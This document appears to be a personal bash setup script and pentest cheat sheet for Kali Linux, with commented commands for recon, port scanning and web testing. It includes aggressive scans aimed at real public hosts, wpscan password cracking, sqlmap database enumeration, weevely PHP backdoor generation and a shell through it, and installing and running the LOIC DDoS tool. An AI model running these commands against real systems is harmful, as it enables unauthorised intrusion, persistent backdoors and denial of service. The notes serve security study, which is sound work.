#!/bin/bash


# SETTING UP KALI
#################

function fun_vbox_active(){
	VBoxClient --clipboard
	VBoxClient --draganddrop
	sudo adduser $USER vboxsf
	sudo VBoxControl sharedfolder list --automount
}


# GENERAL
sudo apt-get install git -y			# Coding version control & public repos
sudo apt-get install gcc -y			# C language compiler
sudo apt-get install kolourpaint -y	# Simple image editor
sudo apt-get install winetricks -y	# Support for wine
sudo apt-get install grsync -y		# GUI for rsync
sudo apt-get install obs-studio -y	# Screen capturing software/gaming
sudo apt-get install screenfetch -y	# Display system info to terminal
sudo apt-get install nano -y		# Simple terminal text editor

# KALI SPECIFIC
sudo apt-get install preload -y		# Installs & preloads common Kali resources
sudo apt-get install bleachbit -y	# Shred files and remove temp/cache
sudo apt-get install bum -y			# "Boot Up Manager" - disabled unnecessary services/apps run sudo apt-get install during bootum
sudo apt-get install gnome-do -y	# Execute apps from keyboard commands
sudo apt-get install apt-file -y	# List contents of a package without have to install or fetch it
sudo apt-get install scrub -y		# Secure deletion program
sudo apt-get install shutter -y		# Screenshot tool for desktop
sudo apt-get install tor -y			# Onion routing web browser / anonymity
sudo apt-get install chkrootkit -y	# Scan OS to determine if locally infected with rootkits
sudo apt-get install metagoofil -y	# Reverse image lookups
sudo apt-get install recon-ng -y	# Opensource recon tool
sudo apt-get install httrack -y		# Download and mirror whole websites
#sudo apt-get install mono-mcs -y	# C# compiler
#sudo apt-get install mono-gmcs -y	# C# compiler
#sudo apt-get install mono-devel -y	# C# compiler
#sudo apt-get install liblog4net-cil-dev -y		# C# compiler
#sudo apt-get install mono-complete -y			# C# compiler
#sudo apt-get install ca-certificates-mono -y	# C# compiler
#sudo apt-get install mono-xsp4 -y	# C# compiler
sudo apt-get install openvas -y		# OpenVAS framework for assessing vulnerabilities on a network
sudo apt-get install openvas-cli -y	# OpenVAS framework for assessing vulnerabilities on a network
sudo apt-get install openvas-scanner -y			# OpenVAS framework for assessing vulnerabilities on a network

 


########################
# COMMANDS AND PROCESSES
########################

# Backup and replace default SSH keys
	cd /etc/ssh
	mkdir keys_backup_ssh
	mv ssh_host_* keys_backup_ssh
	dpkg-reconfigure openssh-server
	# Start ssh with `service ssh start`
	# Confirm ssh is running with `netstat -antp`

# Manage proxy settings
	leafpad /etc/proxychains.conf
	# Comment out "strict_chain" with a #
	# Uncomment "dynamic_chain" by removing the #
	# Make sure the socks5 proxy is active by adding "socks4 	127.0.0.1 9050" to the bottom of the file.

# Ensure system is not compromised with 
	chkrootkit


# RECON
#######
metagoofil help		# Extract metadata of public domains (documents from sites)
theharvester help	# Quickly find publically available data on a targeted person or website/IP
whois google.com	# Grab personal metadata on the registrant of a web domain
nslookup google.com	# Grab basic info (IP address) on a domain
fierce -h			# Find all associated domains/IPs based on a single domain
	fierce -dns google.com
dmitry -h			# Gathers as much info as possible on a host as fast as possible.
	dmitry -winsepfbo google.com
git clone https://github.com/leebaird/discover.git	# Quickly conduct passive recon on a company (automates many searches)
	./discover.sh
recon-ng			# Perform basic recon
	load infodb
	#if load `ipinfodb` & `run` doesn't work, you will need an API key from the recon-ng's website


# PORT MAPPING
##############
traceroute www.google.com	# Follow the path packets take to reach their destinations
nmap -v --tracerout 104.210.194.254	# Traceroute via nmap
hping3 -S www.pluralsight.com -p 80 -c 3 	# Send a ping-like command when standard ping is being blocked. This specific command checks port 80 for 3 attempts.
nmap -T4 -v -PN -n -sS --top-ports 100 --max-parallelism 10 -oA nmapSYN 104.210.194.254
	# -T4 = speed at which nmap executes. 1 is the slowest, 5 is the fastest
	# -v = verbose mode
	# -P = don't ping idventified active systems
	# -N = no resolusion should be made
	# -A = Enable aggressive options 
	# -sS = a send packet type of send
		# -sA = an alternative type that ckecks for ACKs and determines firewall rules
	# --top-ports 100 = ping the top 100 ports
	# --max-Parallelism = limit the max amount of outstanding probes
	# -oA = output results to the following filename (next argument) in all formats (normal, grep-able, xml)
	# IP may also be a domain name "www.google.com"
nmap -T5 -PN -v -A -oA nmapComplete 89.34.96.142	# A far more aggressive/thorough scan


# WEB PEN
#########
wafw00f www.google.com	# Detect WAFs (web application firewalls) on a named domain.
lbd www.google.com	# Determine if a domain uses either DNS or HTTP load balancing. Load balancers can explain strange behavior in various scripts/exploits
httrack "www.google.com" -O "/tmp/httrack" -v	# Mirror an entire website
sslscan www.google.com	# Query SSL services to determine it's details and cyphers. 
wpscan --url 129.168.1.1 --enumerate vp	# Scan Wordpress / CMS systems for known vulnerabilities and senumerate the system
	wpscan --url 129.168.1.1 --enumerate u	# Scan Wordpress / CMS systems for known vulnerabilities and senumerate the users
	wpscan --url 192.168.1.1 --wordlist /path/to/dictionary.txt --username admin	# Attempt to crack the 'admin' account using a predetermined list of words.
sqlmap -r /path/to/burpsuite/capture.txt --dbs	# When filing in a form with BurpSuite capturing it will create a map of the databases. Use sqlmap for a breakdown of all databases
	sqlmap -r /path/to/burpsuite/capture.txt -D my_database	# Show all tables within the "my_database" SQL database
weevely -h	# Maintains access via webshell to previously compromised websites - hold the backdoor open.
	weevely generate mypassword /root/Desktop/weevely.php	# Generates a backdoor PHP file, to be uploaded to target, with an access password of "mypassword" at the location of /root/Desktop ...
	weevely http://192.168.1.1/dvwa/hackable/weevely.php mypassword	# Opens a shell into the named URL access with the password from the PHP file generated earlier


# ETC
#####
# Install LOIC DDoS tool	- 	https://www.linuxsecrets.com/discussions/627-how-to-install-loic-in-kali-linux-low-orbit-ion-cannon
git clone https://github.com/NewEraCracker/LOIC
#cd LOIC/src/
#mdtool build
cd LOIC/
./loic.sh install
./loic.sh update
./loic.sh run


# INTERNAL NETWORK SCANNING
###########################
# Before opening OpenVAS for the first time you must use the "openvas initial setup" program. CLI name is `openvas-setup`
	# It will display a critical password THAT YOU MUST NOT LOOSE
		# Default username is "admin"











